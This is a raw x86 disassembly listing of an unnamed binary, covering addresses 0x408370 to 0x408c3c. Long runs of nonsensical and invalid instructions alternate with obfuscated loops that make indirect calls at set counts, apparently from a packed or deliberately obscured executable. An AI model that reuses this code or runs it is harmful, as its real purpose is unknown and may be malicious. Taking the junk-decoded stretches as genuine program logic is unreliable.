  408370:	sub    al,0xda
  408372:	rol    bh,1
  408374:	imul   eax,esp,0x5739038f
  40837a:	xchg   DWORD PTR [esi+eiz*2-0x35],ecx
  40837e:	mov    dh,0x77
  408380:	(bad)  [ebp+ebp*2+0x1de1d964]
  408387:	add    eax,0xc4cc0a6c
  40838c:	xor    ebx,edi
  40838e:	sbb    bl,ch
  408390:	jl     0x4083cd
  408392:	inc    ebx
  408393:	rol    DWORD PTR [eax],0x8d
  408396:	pop    esi
  408397:	(bad)  
  408398:	jle    0x4083c4
  40839a:	jmp    0x63ea:0xe5306c4a
  4083a1:	dec    esp
  4083a2:	dec    edi
  4083a3:	imul   edx,DWORD PTR [esi],0xb55e6f7e
  4083a9:	adc    ah,bl
  4083ab:	dec    ebp
  4083ac:	mov    esp,0x89f2d79f
  4083b1:	fwait
  4083b2:	jnp    0x40841a
  4083b4:	dec    esp
  4083b5:	push   ebp
  4083b6:	jecxz  0x408385
  4083b8:	jecxz  0x408359
  4083ba:	imul   esi,DWORD PTR [ebx],0x9
  4083bd:	inc    ecx
  4083be:	xor    al,0x16
  4083c0:	ror    DWORD PTR [ebx+0x7b39cd37],0xeb
  4083c7:	sbb    cl,ch
  4083c9:	fwait
  4083ca:	test   al,0x5c
  4083cc:	pop    esi
  4083cd:	(bad)  
  4083ce:	sub    edx,edi
  4083d0:	adc    dh,ah
  4083d2:	jecxz  0x408394
  4083d4:	sub    BYTE PTR [ebx+0x6a],bh
  4083d7:	retf   0x1d6e
  4083da:	nop
  4083db:	(bad)  
  4083dc:	(bad)  
  4083dd:	xchg   ebp,eax
  4083de:	adc    eax,0xc948b17a
  4083e3:	jl     0x408433
  4083e5:	jo     0x408407
  4083e7:	inc    esi
  4083e8:	(bad)  
  4083e9:	dec    eax
  4083ea:	aam    0xa8
  4083ec:	icebp  
  4083ed:	jmp    0x382b:0x6d605f6a
  4083f4:	push   0x49
  4083f6:	(bad)  
  4083f8:	xchg   edx,eax
  4083f9:	mov    ebp,eax
  4083fb:	cmp    BYTE PTR [edi-0x4e54e299],bh
  408401:	es imul ebx,ebx,0xee196a6e
  408408:	in     al,dx
  408409:	cs pop ds
  40840b:	xor    edi,ecx
  40840d:	pop    esi
  40840e:	dec    edi
  40840f:	jle    0x4083b1
  408411:	add    al,BYTE PTR [edx+0x76]
  408414:	xchg   edx,eax
  408415:	or     al,0xe
  408417:	and    al,0x72
  408419:	and    ecx,DWORD PTR [eax]
  40841b:	aad    0x58
  40841d:	add    BYTE PTR [edi],al
  40841f:	adc    eax,0x3b9ec477
  408424:	rol    BYTE PTR es:[ecx+0x50],0x7e
  408429:	push   ss
  40842a:	mov    edi,0x2b55742a
  40842f:	dec    ecx
  408430:	push   eax
  408431:	cld    
  408432:	jle    0x4083da
  408434:	or     esi,ebp
  408436:	(bad)  
  408437:	adc    cl,cl
  408439:	push   ecx
  40843a:	adc    BYTE PTR [eax],0x57
  40843d:	inc    esi
  40843e:	ror    DWORD PTR [ebx],0xf3
  408441:	adc    BYTE PTR [edx+0x3e],dl
  408444:	sub    bh,BYTE PTR ds:0xb7ec7018
  40844a:	int    0xf0
  40844c:	call   0x2ad40a09
  408451:	mov    ah,0xe
  408453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408454:	dec    eax
  408455:	cmp    cl,al
  408457:	not    DWORD PTR ds:0xc634e4d2
  40845d:	xchg   esp,eax
  40845e:	jbe    0x40846e
  408460:	xor    ecx,DWORD PTR [edi-0x79]
  408463:	jle    0x40842e
  408465:	(bad)  
  408466:	adc    al,0xa7
  408468:	sti    
  408469:	sub    DWORD PTR [esi-0x234540a8],eax
  40846f:	mov    gs,WORD PTR [esi]
  408471:	addr16 push esp
  408473:	cmp    esp,esi
  408475:	sbb    DWORD PTR [edi+0x53],ebx
  408478:	mov    ah,0x21
  40847a:	inc    esi
  40847b:	adc    ecx,DWORD PTR [eax+eiz*2-0x591f7940]
  408482:	stos   BYTE PTR es:[edi],al
  408483:	jb     0x409cf2
  408489:	mov    edx,DWORD PTR [ebp-0x28]
  40848c:	sbb    edi,0x56c5
  408492:	mov    edi,DWORD PTR [ebp-0x4]
  408495:	xor    ebx,DWORD PTR ds:0x432dd6
  40849b:	xor    edx,eax
  40849d:	and    DWORD PTR ds:0x434411,0x0
  4084a7:	jmp    0x4084bb
  4084ac:	xor    ebx,ebx
  4084ae:	xor    ebx,DWORD PTR ds:0x434411
  4084b4:	inc    ebx
  4084b5:	mov    DWORD PTR ds:0x434411,ebx
  4084bb:	cmp    DWORD PTR ds:0x434411,0x18
  4084c2:	jae    0x4084e3
  4084c8:	cmp    DWORD PTR ds:0x434411,0x22
  4084cf:	jne    0x4084de
  4084d5:	push   DWORD PTR [ebp-0x1c]
  4084d8:	call   DWORD PTR ds:0x432c42
  4084de:	jmp    0x4084ac
  4084e3:	xor    edi,eax
  4084e5:	add    edi,ecx
  4084e7:	mov    ebx,DWORD PTR ds:0x43441d
  4084ed:	add    DWORD PTR ds:0x432dca,ebx
  4084f3:	add    edx,ecx
  4084f5:	add    DWORD PTR ds:0x434366,ecx
  4084fb:	imul   edx,edi
  4084fe:	mov    edi,DWORD PTR [ebp-0x8]
  408501:	mov    ebx,DWORD PTR ds:0x43442d
  408507:	or     DWORD PTR ds:0x434419,ebx
  40850d:	mov    ebx,DWORD PTR [ebp-0x10]
  408510:	sub    ebx,edi
  408512:	cmp    ebx,edx
  408514:	mov    DWORD PTR ds:0x434425,0x4da5
  40851e:	ja     0x40879c
  408524:	and    DWORD PTR ds:0x4326fc,0x0
  40852e:	jmp    0x408540
  408533:	mov    edx,DWORD PTR ds:0x4326fc
  408539:	inc    edx
  40853a:	mov    DWORD PTR ds:0x4326fc,edx
  408540:	cmp    DWORD PTR ds:0x4326fc,0x1b
  408547:	jae    0x408786
  40854d:	cmp    DWORD PTR ds:0x4326fc,0x1d
  408554:	jne    0x408563
  40855a:	push   DWORD PTR [ebp-0x28]
  40855d:	call   DWORD PTR ds:0x4329d2
  408563:	jmp    0x408533
  408568:	adc    DWORD PTR ds:0x432dc6,0x7927
  408572:	jmp    0x408786
  408577:	rcr    DWORD PTR [ebp-0xc8d3cb2],0x51
  40857e:	popf   
  40857f:	push   es
  408580:	stos   DWORD PTR es:[edi],eax
  408581:	arpl   bp,sp
  408583:	jg     0xd4e8d63b
  408589:	jo     0x4085fb
  40858b:	imul   edi,DWORD PTR [edi+0x70],0xbdc5b570
  408592:	jns    0x408602
  408594:	add    eax,0x7a1a0d7
  408599:	jb     0x408595
  40859b:	sub    BYTE PTR [edx],al
  40859d:	add    dh,BYTE PTR [edi-0x590730d]
  4085a3:	sbb    BYTE PTR [esi-0x54],dl
  4085a6:	popa   
  4085a7:	inc    esp
  4085a8:	ins    BYTE PTR es:[edi],dx
  4085a9:	jb     0x40858d
  4085ab:	repnz pushf 
  4085ad:	pop    ebx
  4085ae:	cdq    
  4085af:	cmp    cl,BYTE PTR [esi+0x4a608fc2]
  4085b5:	sub    eax,esp
  4085b7:	cwde   
  4085b8:	lds    ebx,FWORD PTR [eax]
  4085ba:	sbb    BYTE PTR [ecx],dh
  4085bc:	sub    ebp,DWORD PTR es:[ebp+0x490910ed]
  4085c3:	rol    ah,0xa6
  4085c6:	and    al,BYTE PTR [eax]
  4085c8:	and    al,0x35
  4085ca:	cmc    
  4085cb:	jmp    0xb9aca111
  4085d0:	mov    eax,0xfafb3900
  4085d5:	and    BYTE PTR [ebx-0x66],ah
  4085d8:	pop    ds
  4085d9:	into   
  4085da:	jmp    0x408603
  4085dc:	(bad)  
  4085de:	jmp    0x4085bc
  4085e0:	or     cl,dl
  4085e2:	sbb    eax,0x7fa39720
  4085e7:	sbb    al,al
  4085e9:	cmp    bl,ch
  4085eb:	pop    eax
  4085ec:	out    dx,eax
  4085ed:	mov    ah,BYTE PTR [edx-0x78b3aa79]
  4085f3:	je     0x408663
  4085f5:	aas    
  4085f6:	adc    eax,DWORD PTR [ebp+0x32b6817a]
  4085fc:	not    BYTE PTR [eax-0x1a]
  4085ff:	sbb    eax,0xdbefde21
  408604:	icebp  
  408605:	pop    ss
  408606:	push   0x54c5814c
  40860b:	les    ebp,FWORD PTR [edx-0x202dafd]
  408611:	push   ebp
  408612:	(bad)  
  408613:	scas   eax,DWORD PTR es:[edi]
  408614:	xchg   esp,eax
  408615:	sbb    eax,0xa8ea9642
  40861a:	inc    edx
  40861b:	fcmovne st,st(7)
  40861d:	dec    edi
  40861e:	sub    esi,DWORD PTR [esi-0x1a]
  408621:	jbe    0x40861b
  408623:	lahf   
  408624:	std    
  408625:	rcr    BYTE PTR [edx-0x3f],cl
  408628:	xor    DWORD PTR ds:0xc5543889,esp
  40862e:	cdq    
  40862f:	stos   BYTE PTR es:[edi],al
  408630:	loop   0x4085b7
  408632:	sti    
  408633:	outs   dx,BYTE PTR ds:[esi]
  408634:	xchg   ecx,eax
  408635:	cmp    esp,DWORD PTR [esi]
  408637:	(bad)  
  408638:	in     al,0x1
  40863a:	imul   ecx,eax,0xffffffe4
  40863d:	sub    eax,0x798fd9e9
  408642:	hlt    
  408643:	cwde   
  408644:	lds    esi,FWORD PTR ds:0xb8c48389
  40864a:	cmc    
  40864b:	sub    ch,BYTE PTR [ecx]
  40864d:	(bad)  
  40864e:	mov    esp,0x2d0104b5
  408653:	mov    ch,0xe1
  408655:	call   0xa987:0xc6f97257
  40865c:	adc    cl,cl
  40865e:	add    DWORD PTR [edx],esp
  408660:	shl    DWORD PTR [ebx+0x3f9551b8],0x4c
  408667:	cli    
  408668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408669:	shl    DWORD PTR [edi+ebx*2],cl
  40866c:	je     0x4086c4
  40866e:	add    eax,0xfeaf4c58
  408673:	adc    eax,0xdc5c1205
  408678:	pop    ecx
  408679:	(bad)  
  40867a:	in     eax,0x77
  40867c:	xchg   edi,eax
  40867d:	addr16 out dx,eax
  40867f:	and    eax,0xb01fe8c0
  408684:	mov    dl,0xc9
  408686:	sti    
  408687:	in     eax,dx
  408688:	sbb    eax,0xbf5aff1a
  40868d:	dec    ebx
  40868e:	jmp    DWORD PTR [ecx-0x2a79d209]
  408694:	mov    edi,0x8a0486d1
  408699:	fchs   
  40869b:	push   0x4d99a1bf
  4086a0:	xor    al,0xba
  4086a2:	int3   
  4086a3:	cld    
  4086a4:	xor    DWORD PTR [ecx-0x31],ebp
  4086a7:	mov    bh,0x4
  4086a9:	inc    edx
  4086aa:	sub    esi,esp
  4086ac:	(bad)  
  4086ad:	xlat   BYTE PTR ds:[ebx]
  4086ae:	out    0x3d,al
  4086b0:	mov    esi,0xc2e0dca8
  4086b5:	mov    edi,DWORD PTR [edx+0x5f]
  4086b8:	cmp    BYTE PTR [esi+eiz*8],dh
  4086bb:	xchg   ebp,eax
  4086bc:	cmp    eax,0x7dcba32a
  4086c1:	mov    ds:0xfe7fec92,eax
  4086c6:	fcom   DWORD PTR [ecx+0x4d45209e]
  4086cc:	adc    edx,edi
  4086ce:	adc    ecx,DWORD PTR [ecx]
  4086d0:	mov    eax,DWORD PTR gs:[edi+0xd8f3929]
  4086d7:	add    al,0x91
  4086d9:	in     al,0x65
  4086db:	adc    DWORD PTR [ecx+0x3fbc7872],0xe0eabf26
  4086e5:	sbb    BYTE PTR [ecx],bh
  4086e7:	adc    ecx,DWORD PTR [esi-0x784ffddb]
  4086ed:	icebp  
  4086ee:	jecxz  0x4086d4
  4086f0:	mov    ebx,0x619647f
  4086f6:	cwde   
  4086f7:	jbe    0x4086b8
  4086f9:	xor    al,al
  4086fb:	dec    edi
  4086fc:	adc    DWORD PTR ds:0x94959d79,0xd9bac5b6
  408706:	pop    edx
  408707:	in     al,0xb1
  408709:	inc    edi
  40870a:	lods   al,BYTE PTR ds:[esi]
  40870b:	test   al,0xa4
  40870d:	bound  edx,QWORD PTR [edi+ebp*1-0x15]
  408711:	int3   
  408712:	ss push 0xffffffb4
  408715:	mov    esp,0xdf1f3668
  40871a:	rcl    DWORD PTR [ebx+0x7c8a37],1
  408720:	xor    eax,0x9bc035ec
  408725:	inc    ebx
  408726:	push   eax
  408727:	push   esp
  408728:	adc    eax,0xcef679ac
  40872d:	ss cmc 
  40872f:	in     al,dx
  408730:	xchg   DWORD PTR [edi-0x2e476267],ebp
  408736:	lds    edi,FWORD PTR [esi+0x4e]
  408739:	mov    ?,WORD PTR [eax-0x1cd33c13]
  40873f:	(bad)  
  408740:	cld    
  408741:	dec    eax
  408742:	xchg   esp,eax
  408743:	daa    
  408744:	dec    ecx
  408745:	jo     0x408793
  408747:	sub    esp,0xfffffffe
  40874a:	rol    BYTE PTR [ebp-0x288ddf4b],1
  408750:	aad    0x83
  408752:	push   ebx
  408753:	sub    ch,BYTE PTR [ebx+0xa]
  408756:	(bad)  
  408757:	rcl    DWORD PTR [edx],1
  408759:	outs   dx,BYTE PTR ds:[esi]
  40875a:	arpl   WORD PTR [eax+0x4f0d34b6],bx
  408760:	or     DWORD PTR [edx+0x75],ebx
  408763:	scas   eax,DWORD PTR es:[edi]
  408764:	push   ebp
  408765:	fstp   TBYTE PTR [ecx]
  408767:	jle    0x408763
  408769:	xchg   edx,eax
  40876a:	mov    ecx,0xdfdd1d6b
  40876f:	lahf   
  408770:	jge    0x4087c9
  408772:	push   0x6
  408774:	push   ecx
  408775:	enter  0xc446,0x48
  408779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40877a:	mov    BYTE PTR [ebx],dh
  40877c:	jge    0x4087c5
  40877e:	mov    eax,ds:0xc0782711
  408783:	in     eax,0x5e
  408785:	dec    ebp
  408786:	mov    edx,DWORD PTR [ebp-0x4]
  408789:	xor    edx,eax
  40878b:	add    edx,ecx
  40878d:	mov    DWORD PTR ds:0x43438a,0x22ee
  408797:	jmp    0x408b38
  40879c:	and    edx,edi
  40879e:	mov    edx,DWORD PTR [ebp-0x2c]
  4087a1:	or     edi,edi
  4087a3:	mov    edi,DWORD PTR [ebp-0x4]
  4087a6:	xor    edx,eax
  4087a8:	not    ebx
  4087aa:	xor    edi,eax
  4087ac:	sub    DWORD PTR ds:0x43438a,0x43441d
  4087b6:	add    edi,ecx
  4087b8:	or     ebx,DWORD PTR ds:0x434415
  4087be:	add    edx,ecx
  4087c0:	or     DWORD PTR ds:0x43438e,edi
  4087c6:	imul   edx,edi
  4087c9:	adc    DWORD PTR ds:0x434415,ebx
  4087cf:	mov    edi,DWORD PTR [ebp-0x8]
  4087d2:	sub    ebx,0x42e0
  4087d8:	mov    ebx,DWORD PTR [ebp-0x10]
  4087db:	and    DWORD PTR ds:0x434372,0x1110
  4087e5:	sub    ebx,edi
  4087e7:	cmp    ebx,edx
  4087e9:	mov    DWORD PTR ds:0x432708,0x5f46
  4087f3:	ja     0x40880b
  4087f9:	mov    edx,DWORD PTR [ebp-0x28]
  4087fc:	mov    DWORD PTR ds:0x434425,0x1e0
  408806:	jmp    0x408b2a
  40880b:	mov    edx,DWORD PTR [ebp-0x30]
  40880e:	mov    edi,DWORD PTR [ebp-0x4]
  408811:	xor    DWORD PTR ds:0x432dd2,ecx
  408817:	xor    edx,eax
  408819:	mov    DWORD PTR ds:0x43436a,0x13
  408823:	cmp    DWORD PTR ds:0x43436a,0x0
  40882a:	je     0x40887c
  408830:	cmp    DWORD PTR ds:0x43436a,0x4
  408837:	jne    0x40884e
  40883d:	push   0x43287d
  408842:	push   DWORD PTR [ebp-0x20]
  408845:	push   DWORD PTR [ebp-0xc]
  408848:	call   DWORD PTR ds:0x432cfa
  40884e:	cmp    DWORD PTR ds:0x43436a,0x5
  408855:	jne    0x40886a
  40885b:	xor    ebx,ebx
  40885d:	add    ebx,DWORD PTR ds:0x43436a
  408863:	dec    ebx
  408864:	mov    DWORD PTR ds:0x43436a,ebx
  40886a:	mov    ebx,DWORD PTR ds:0x43436a
  408870:	dec    ebx
  408871:	mov    DWORD PTR ds:0x43436a,ebx
  408877:	jmp    0x408823
  40887c:	xor    edi,eax
  40887e:	add    edi,ecx
  408880:	add    edx,ecx
  408882:	imul   edx,edi
  408885:	mov    edi,DWORD PTR [ebp-0x8]
  408888:	mov    ebx,DWORD PTR [ebp-0x10]
  40888b:	sub    ebx,edi
  40888d:	cmp    ebx,edx
  40888f:	ja     0x40889d
  408895:	mov    edx,DWORD PTR [ebp-0x2c]
  408898:	jmp    0x408b2a
  40889d:	mov    edx,DWORD PTR [ebp-0x34]
  4088a0:	mov    edi,DWORD PTR [ebp-0x4]
  4088a3:	xor    edx,eax
  4088a5:	xor    edi,eax
  4088a7:	add    edi,ecx
  4088a9:	add    edx,ecx
  4088ab:	imul   edx,edi
  4088ae:	mov    edi,DWORD PTR [ebp-0x8]
  4088b1:	mov    ebx,DWORD PTR [ebp-0x10]
  4088b4:	sub    ebx,edi
  4088b6:	cmp    ebx,edx
  4088b8:	ja     0x4088c6
  4088be:	mov    edx,DWORD PTR [ebp-0x30]
  4088c1:	jmp    0x408b2a
  4088c6:	mov    edx,DWORD PTR [ebp-0x38]
  4088c9:	mov    edi,DWORD PTR [ebp-0x4]
  4088cc:	xor    edx,eax
  4088ce:	xor    edi,eax
  4088d0:	add    edi,ecx
  4088d2:	add    edx,ecx
  4088d4:	imul   edx,edi
  4088d7:	mov    edi,DWORD PTR [ebp-0x8]
  4088da:	mov    ebx,DWORD PTR [ebp-0x10]
  4088dd:	sub    ebx,edi
  4088df:	cmp    ebx,edx
  4088e1:	ja     0x4088ef
  4088e7:	mov    edx,DWORD PTR [ebp-0x34]
  4088ea:	jmp    0x408b2a
  4088ef:	mov    edx,DWORD PTR [ebp-0x3c]
  4088f2:	mov    edi,DWORD PTR [ebp-0x4]
  4088f5:	xor    edx,eax
  4088f7:	xor    edi,eax
  4088f9:	add    edx,ecx
  4088fb:	add    edi,ecx
  4088fd:	imul   edx,edi
  408900:	mov    edi,DWORD PTR [ebp-0x8]
  408903:	mov    ebx,DWORD PTR [ebp-0x10]
  408906:	sub    ebx,edi
  408908:	cmp    ebx,edx
  40890a:	mov    edx,DWORD PTR [ebp-0x38]
  40890d:	jbe    0x408b2a
  408913:	mov    edx,DWORD PTR [ebp-0x3c]
  408916:	jmp    0x408b2a
  40891b:	imul   ebx,DWORD PTR [edx-0x5eb67e05],0x71
  408922:	jb     0x40895b
  408924:	adc    esi,DWORD PTR [ebx+0x506a284b]
  40892a:	push   edi
  40892b:	mov    eax,ds:0x697070d2
  408930:	jg     0x4089a2
  408932:	jo     0x4088d7
  408934:	jno    0x408990
  408936:	xlat   BYTE PTR ds:[ebx]
  408937:	xor    ah,bh
  408939:	add    dh,cl
  40893b:	inc    esi
  40893c:	xor    ah,dl
  40893e:	in     al,dx
  40893f:	hlt    
  408940:	in     eax,0xb1
  408942:	xchg   esi,eax
  408943:	mov    ah,0xfd
  408945:	or     dl,bl
  408947:	xor    DWORD PTR [ecx],ebp
  408949:	mov    eax,DWORD PTR [eax]
  40894b:	cmp    eax,0xdefda741
  408950:	out    0x87,al
  408952:	test   BYTE PTR [ebx],dh
  408954:	fsubp  st(5),st
  408956:	xchg   edx,eax
  408957:	clc    
  408958:	enter  0x7cf3,0xfa
  40895c:	pop    esi
  40895d:	mov    al,cl
  40895f:	push   0x5a05aca7
  408964:	jp     0x408902
  408966:	dec    ecx
  408967:	sbb    eax,0x43684d61
  40896c:	pusha  
  40896d:	xor    al,0xcd
  40896f:	ins    BYTE PTR es:[edi],dx
  408970:	inc    edx
  408971:	mov    eax,0xffdd3592
  408976:	aas    
  408977:	jb     0x4089bd
  408979:	pop    edi
  40897a:	enter  0x7071,0x2b
  40897e:	or     al,0x7
  408980:	mov    dh,ch
  408982:	sbb    BYTE PTR [esp+eax*2+0x3f671dab],0xd6
  40898a:	inc    esp
  40898b:	aad    0xba
  40898d:	mov    ds:0xbcc6316f,eax
  408992:	adc    al,0xd4
  408994:	std    
  408995:	mov    cl,0x25
  408997:	fist   DWORD PTR [esi]
  408999:	xchg   BYTE PTR [edx],dl
  40899b:	cmp    DWORD PTR [edx],esp
  40899d:	pop    ecx
  40899e:	xor    bh,dl
  4089a0:	push   esp
  4089a1:	push   ds
  4089a2:	call   0xf3cbbb85
  4089a7:	rcr    bh,1
  4089a9:	jg     0x4089f3
  4089ab:	jl     0x4089de
  4089ad:	pop    eax
  4089ae:	or     ah,BYTE PTR [edi-0x46]
  4089b1:	mov    edi,0xdccf434f
  4089b6:	ds xchg esi,eax
  4089b8:	sub    al,BYTE PTR [edx*1-0x541fb1fb]
  4089bf:	es int 0x38
  4089c2:	mov    al,0x53
  4089c4:	and    dh,ah
  4089c6:	adc    eax,DWORD PTR [ebp+0x48ee5657]
  4089cc:	inc    esp
  4089cd:	dec    edi
  4089ce:	xlat   BYTE PTR ds:[ebx]
  4089cf:	jg     0x408a0c
  4089d1:	cmp    al,0x8b
  4089d3:	adc    ebp,DWORD PTR [edi]
  4089d5:	leave  
  4089d6:	mov    DWORD PTR ds:0xbd562109,ebx
  4089dc:	adc    ah,cl
  4089de:	rol    BYTE PTR [esp+esi*1],1
  4089e1:	xor    eax,0x6234bf37
  4089e6:	addr16 push edi
  4089e8:	test   al,0x4c
  4089ea:	fs sub ebp,esi
  4089ed:	test   al,0x76
  4089ef:	aas    
  4089f0:	lea    ebp,[ebx-0x755d0622]
  4089f6:	aam    0x1
  4089f8:	pop    ebp
  4089f9:	sar    BYTE PTR [edx],1
  4089fb:	mov    eax,0xfc9ce74d
  408a00:	adc    al,0x88
  408a02:	dec    edi
  408a03:	xchg   edi,eax
  408a04:	fisttp DWORD PTR [eax-0x53c6a347]
  408a0a:	mov    esp,0x88a097d3
  408a0f:	test   DWORD PTR [edi-0x57b816ad],edi
  408a15:	arpl   WORD PTR [ebp+0x2684b265],ax
  408a1b:	fild   DWORD PTR [esp+eax*1+0x3a3faef6]
  408a22:	cmc    
  408a23:	jnp    0x4089e2
  408a25:	xchg   esi,eax
  408a26:	or     BYTE PTR [eax],cl
  408a28:	sar    BYTE PTR [ecx],cl
  408a2a:	adc    esi,esi
  408a2c:	leave  
  408a2d:	and    dh,BYTE PTR [edx+ecx*2+0x184423d9]
  408a34:	xchg   DWORD PTR [ecx+0x40],eax
  408a37:	stos   BYTE PTR es:[edi],al
  408a38:	lea    eax,[ebp-0x48537f1c]
  408a3e:	jmp    0x22975716
  408a43:	test   eax,0xba18e19d
  408a48:	(bad)  
  408a4a:	fwait
  408a4b:	je     0x408a42
  408a4d:	enter  0x912c,0x0
  408a51:	not    DWORD PTR [edi+0x4bbdc1c0]
  408a57:	jne    0x4089ef
  408a59:	sti    
  408a5a:	popa   
  408a5b:	rol    BYTE PTR [ebp-0x66],cl
  408a5e:	add    DWORD PTR [ebx-0x3d8d4588],edi
  408a64:	es cld 
  408a66:	out    dx,eax
  408a67:	frstor ds:[ebx]
  408a6a:	xchg   BYTE PTR [edx-0x61],bl
  408a6d:	mov    cl,0x47
  408a6f:	mov    bl,0x4c
  408a71:	sub    ah,BYTE PTR [eax]
  408a73:	es loope 0x408a1e
  408a76:	in     al,dx
  408a77:	and    cl,BYTE PTR [esi+0x75]
  408a7a:	aaa    
  408a7b:	mov    eax,0x332dfb2e
  408a80:	jp     0x408a56
  408a82:	mov    edx,0x91199573
  408a87:	std    
  408a88:	xchg   edx,eax
  408a89:	ret    0xa24e
  408a8c:	enter  0xce64,0x5f
  408a90:	pop    esi
  408a91:	addr16 pop ecx
  408a93:	pop    ds
  408a94:	mov    esi,0x2850afd1
  408a99:	dec    edx
  408a9a:	les    ebp,FWORD PTR [ecx+0x41]
  408a9d:	or     al,0xb6
  408a9f:	mov    esp,0x56cd710e
  408aa4:	(bad)  
  408aa5:	aaa    
  408aa6:	mov    bl,0x72
  408aa8:	fnstenv [ebx-0x4d]
  408aab:	or     ch,cl
  408aad:	mov    dh,BYTE PTR [eax+0x40]
  408ab0:	into   
  408ab1:	or     DWORD PTR [ecx+0x812b9c5],edi
  408ab7:	ficom  DWORD PTR [ebx]
  408ab9:	push   ecx
  408aba:	jnp    0x408a59
  408abc:	inc    eax
  408abd:	jns    0x408aaf
  408abf:	fwait
  408ac0:	dec    edi
  408ac1:	cwde   
  408ac2:	std    
  408ac3:	aam    0xe2
  408ac5:	add    al,0xc
  408ac7:	push   es
  408ac8:	fisub  DWORD PTR [esi]
  408aca:	js     0x408b40
  408acc:	ins    BYTE PTR es:[edi],dx
  408acd:	pop    eax
  408ace:	lahf   
  408acf:	(bad)  
  408ad0:	pop    eax
  408ad1:	pop    ebp
  408ad2:	test   BYTE PTR ds:0xa9d249dd,cl
  408ad8:	jo     0x408af6
  408ada:	jp     0x408ae1
  408adc:	adc    DWORD PTR [esp+ebp*2+0x45],eax
  408ae0:	sbb    DWORD PTR [ecx],ebx
  408ae2:	push   eax
  408ae3:	mov    edi,0xb05d722a
  408ae8:	loope  0x408b63
  408aea:	fcom   DWORD PTR [edx+eiz*4]
  408aed:	cmp    al,0xbd
  408aef:	adc    ah,ah
  408af1:	fs jecxz 0x408aae
  408af4:	lods   eax,DWORD PTR ds:[esi]
  408af5:	mov    ds:0xbb28f7bc,al
  408afa:	add    cl,BYTE PTR [ebp-0x1760a160]
  408b00:	call   0xf564eb48
  408b05:	jp     0x408ac1
  408b07:	bound  esp,QWORD PTR [ebx-0x54]
  408b0a:	test   DWORD PTR [ecx-0x6d],esi
  408b0d:	jns    0x408b89
  408b0f:	adc    ecx,ecx
  408b11:	pushf  
  408b12:	jl     0x408b87
  408b14:	jo     0x408aa8
  408b16:	dec    ebp
  408b17:	fcom   DWORD PTR [edi-0x5b]
  408b1a:	in     eax,0x3b
  408b1c:	push   ds
  408b1d:	sti    
  408b1e:	mov    cs,ebp
  408b20:	inc    edi
  408b21:	scas   al,BYTE PTR es:[edi]
  408b22:	jp     0x408b85
  408b24:	mov    ch,0x8b
  408b26:	pop    ebx
  408b27:	sub    ebx,DWORD PTR [edi*8+0x33fc7d8b]
  408b2e:	clc    
  408b2f:	xor    edx,eax
  408b31:	add    edi,ecx
  408b33:	add    edx,ecx
  408b35:	imul   edx,edi
  408b38:	mov    DWORD PTR [ebp+0xc],edx
  408b3b:	mov    edx,DWORD PTR [ebp+0xc]
  408b3e:	mov    DWORD PTR [ebp-0x24],edx
  408b41:	mov    edx,DWORD PTR [ebp-0x8]
  408b44:	add    edx,DWORD PTR [ebp-0x40]
  408b47:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408b4e:	mov    DWORD PTR [ebp-0x1c],edx
  408b51:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  408b58:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  408b5f:	mov    edx,DWORD PTR [ebp-0x18]
  408b62:	xor    edx,eax
  408b64:	add    edx,ecx
  408b66:	jmp    0x409637
  408b6b:	mov    edx,DWORD PTR [ebp-0x18]
  408b6e:	xor    edx,eax
  408b70:	add    edx,DWORD PTR [ebp-0x14]
  408b73:	mov    edi,DWORD PTR [ebp-0x1c]
  408b76:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  408b7d:	mov    BYTE PTR [ebp+0xf],dl
  408b80:	jmp    0x408d94
  408b85:	arpl   WORD PTR [ecx+edx*8+0x7359f11a],dx
  408b8c:	push   ecx
  408b8d:	out    0xb0,eax
  408b8f:	jnp    0x408bf2
  408b91:	cs mov al,0x51
  408b94:	aaa    
  408b95:	call   0x707f:0x697070d0
  408b9c:	jo     0x408bc8
  408b9e:	dec    esp
  408b9f:	cmp    BYTE PTR [esi],al
  408ba1:	add    DWORD PTR [ebx],0x6d
  408ba4:	sbb    esi,edx
  408ba6:	pushf  
  408ba7:	xor    DWORD PTR [ecx*1+0x28e7ceaf],ebx
  408bae:	mov    edx,0xfdd2d75f
  408bb3:	dec    esi
  408bb4:	dec    eax
  408bb5:	dec    edx
  408bb6:	mov    BYTE PTR [ebx*8-0x63e2c43b],ah
  408bbd:	and    al,0xa0
  408bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bc0:	cmp    eax,0xf53b52cb
  408bc5:	jmp    0xc915e3
  408bca:	cmp    eax,0x876bd82e
  408bcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bd1:	pop    ebx
  408bd2:	jmp    0x926a:0x94083116
  408bd9:	pop    ds
  408bda:	leave  
  408bdb:	retf   0xd33
  408bde:	jmp    0x408c3c
  408be0:	jecxz  0x408c52
  408be2:	mov    al,ds:0x1ef0b2c4
  408be7:	mov    esp,0xa4eef60b
  408bec:	mov    ebp,0xe970c178
  408bf1:	lahf   
  408bf2:	fimul  DWORD PTR [edi]
  408bf4:	xchg   ecx,eax
  408bf5:	dec    esp
  408bf6:	sub    edx,DWORD PTR [edx-0x657fb2de]
  408bfc:	das    
  408bfd:	push   es
  408bfe:	iret   
  408bff:	retf   
  408c00:	js     0x408c2e
  408c02:	add    DWORD PTR [edx],ebp
  408c04:	push   edx
  408c05:	push   edx
  408c06:	fmul   QWORD PTR [edi+0x4f8dec6a]
  408c0c:	push   eax
  408c0d:	sub    al,0xe0
  408c0f:	add    BYTE PTR [ebx],ah
  408c11:	xchg   ebx,eax
  408c12:	inc    edi
  408c13:	mov    cl,0x63
  408c15:	retf   0xb0e4
  408c18:	adc    eax,0x6f97be60
  408c1d:	sbb    BYTE PTR [edx+0x32],bl
  408c20:	push   ecx
  408c21:	sbb    cl,bh
  408c23:	xchg   edi,eax
  408c24:	shl    cl,0x2f
  408c27:	addr16 clc 
  408c29:	push   ebx
  408c2a:	mov    dl,0x9b
  408c2c:	adc    BYTE PTR [esi-0x74bd84c],0x53
  408c33:	fs rcl dh,1
  408c36:	push   esi
  408c37:	mov    dl,0xf8
  408c39:	add    BYTE PTR [edx-0x66],ah
  408c3c:	xor    BYTE PTR [eax+0x31],dh
